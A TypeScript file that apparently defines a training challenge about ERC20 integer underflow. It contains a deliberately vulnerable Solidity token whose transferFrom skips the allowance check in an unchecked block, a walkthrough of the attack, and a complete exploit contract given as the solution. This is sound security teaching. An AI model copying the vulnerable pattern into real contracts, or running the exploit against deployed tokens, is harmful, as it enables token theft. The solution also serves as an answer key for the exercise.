import type { VulnerabilityChallenge } from "@/types/vulnerability";

const UNDERFLOW_TOKEN_SOURCE = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract UnderflowToken {
    string public name = "Underflow Token";
    string public symbol = "UDF";
    uint8 public decimals = 18;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor() {
        balanceOf[msg.sender] = 1000000 * 10**uint256(decimals);
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    // VULNERABILITY: unchecked block disables underflow protection!
    // The allowance subtraction can underflow
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        
        // VULNERABLE: unchecked allows underflow!
        // If allowance[from][msg.sender] < amount, this underflows
        unchecked {
            allowance[from][msg.sender] -= amount;
        }
        
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        
        emit Transfer(from, to, amount);
        return true;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
    function getBalance(address account) external view returns (uint256) {
        return balanceOf[account];
    }
    
    function getAllowance(address owner, address spender) external view returns (uint256) {
        return allowance[owner][spender];
    }
}`;

export const erc20UnderflowChallenge: VulnerabilityChallenge = {
  id: "erc20-underflow",
  title: "ERC20 Integer Underflow",
  category: "arithmetic",
  difficulty: "intermediate",

  incident: {
    name: "Token Allowance Underflow",
    date: "Common Vulnerability",
    losses: "Potentially unlimited token theft",
    references: [
      "https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729",
    ],
  },

  description: `# Integer Underflow Vulnerability

## Background

Starting from Solidity 0.8.0, integer underflow automatically reverts. However, developers can disable this protection using \`unchecked\` blocks:

\`\`\`solidity
// Normal: underflow reverts
uint256 x = 0;
x - 1;  // REVERTS!

// Unchecked: underflow wraps around (like Solidity 0.7.x)
unchecked {
    uint256 y = 0;
    y - 1;  // Returns type(uint256).max (huge number!)
}
\`\`\`

## The Vulnerability

This token contract uses an \`unchecked\` block in \`transferFrom\`, allowing underflow:

\`\`\`solidity
function transferFrom(address from, address to, uint256 amount) external returns (bool) {
    require(balanceOf[from] >= amount, "Insufficient balance");
    
    unchecked {
        allowance[from][msg.sender] -= amount;  // Can underflow!
    }
    
    balanceOf[from] -= amount;
    balanceOf[to] += amount;
    return true;
}
\`\`\`

Notice that:
1. \`balanceOf[from] >= amount\` is checked
2. But there's NO check for \`allowance[from][msg.sender] >= amount\`
3. The allowance subtraction can underflow!

## Attack Vector

1. You start with 0 allowance from the victim (token holder)
2. Call \`transferFrom(victim, you, amount)\` where amount > 0
3. The allowance subtraction happens: \`0 - amount\` in unchecked block
4. This underflows to a huge number (no revert!)
5. The transfer succeeds and you steal the tokens!

## Your Task

1. The token holder has 1,000,000 tokens
2. Exploit the underflow in \`transferFrom\`
3. No need to call \`approve\` - just exploit the underflow
4. Goal: Transfer more than 500,000 tokens to your exploit contract

**Target**: The \`UnderflowToken\` contract uses \`unchecked\` that allows underflow.`,

  starterCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUnderflowToken {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function getBalance(address account) external view returns (uint256);
    function getAllowance(address owner, address spender) external view returns (uint256);
}

contract Exploit {
    IUnderflowToken public token;
    
    constructor(address _token) {
        token = IUnderflowToken(_token);
    }
    
    function attack(address victim) external {
        // TODO: Exploit the integer underflow in transferFrom()
        // 
        // 1. The victim has 1,000,000 tokens
        // 2. Your allowance from victim is 0
        // 3. Call transferFrom(victim, this, amount)
        // 4. The allowance subtraction 0 - amount will underflow
        // 5. Steal the tokens!
        //
        // Goal: Get more than 500,000 tokens
    }
}`,

  hint: "The transferFrom function has unchecked allowance subtraction. Your allowance is 0, but unchecked { 0 - amount } underflows to max uint256 instead of reverting. Just call transferFrom directly - no approve needed!",

  setup: {
    contracts: [
      {
        name: "UnderflowToken",
        source: UNDERFLOW_TOKEN_SOURCE,
      },
    ],
    attackerBalance: "10",
  },

  exposedFunctions: [
    {
      name: "balanceOf",
      signature: "balanceOf(address)",
      inputs: [{ name: "account", type: "address" }],
      outputs: [{ name: "", type: "uint256" }],
      stateMutability: "view",
    },
    {
      name: "allowance",
      signature: "allowance(address,address)",
      inputs: [
        { name: "owner", type: "address" },
        { name: "spender", type: "address" },
      ],
      outputs: [{ name: "", type: "uint256" }],
      stateMutability: "view",
    },
    {
      name: "getBalance",
      signature: "getBalance(address)",
      inputs: [{ name: "account", type: "address" }],
      outputs: [{ name: "", type: "uint256" }],
      stateMutability: "view",
    },
    {
      name: "getAllowance",
      signature: "getAllowance(address,address)",
      inputs: [
        { name: "owner", type: "address" },
        { name: "spender", type: "address" },
      ],
      outputs: [{ name: "", type: "uint256" }],
      stateMutability: "view",
    },
    {
      name: "approve",
      signature: "approve(address,uint256)",
      inputs: [
        { name: "spender", type: "address" },
        { name: "amount", type: "uint256" },
      ],
      outputs: [{ name: "", type: "bool" }],
      stateMutability: "nonpayable",
    },
    {
      name: "transferFrom",
      signature: "transferFrom(address,address,uint256)",
      inputs: [
        { name: "from", type: "address" },
        { name: "to", type: "address" },
        { name: "amount", type: "uint256" },
      ],
      outputs: [{ name: "", type: "bool" }],
      stateMutability: "nonpayable",
    },
    {
      name: "transfer",
      signature: "transfer(address,uint256)",
      inputs: [
        { name: "to", type: "address" },
        { name: "amount", type: "uint256" },
      ],
      outputs: [{ name: "", type: "bool" }],
      stateMutability: "nonpayable",
    },
  ],

  constructorParams: {
    params: [
      {
        name: "_token",
        type: "address",
        description: "The UnderflowToken contract address",
      },
    ],
    autoFillOptions: {
      useDeployedContract: "UnderflowToken",
    },
  },

  successCondition: {
    checkBalance: {
      address: "Exploit",
      minBalance: "500000000000000000000000", // 500,000 tokens (18 decimals)
    },
  },

  solution: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUnderflowToken {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract Exploit {
    IUnderflowToken public token;
    
    constructor(address _token) {
        token = IUnderflowToken(_token);
    }
    
    function attack(address victim) external {
        // The unchecked block allows underflow!
        // allowance[victim][this] = 0 initially
        // When transferFrom is called, it does: unchecked { allowance -= amount }
        // 0 - amount = underflow to max uint256 (no revert!)
        // Then balance checks pass and we steal the tokens!
        
        uint256 amount = token.balanceOf(victim);
        token.transferFrom(victim, address(this), amount);
    }
}`,
};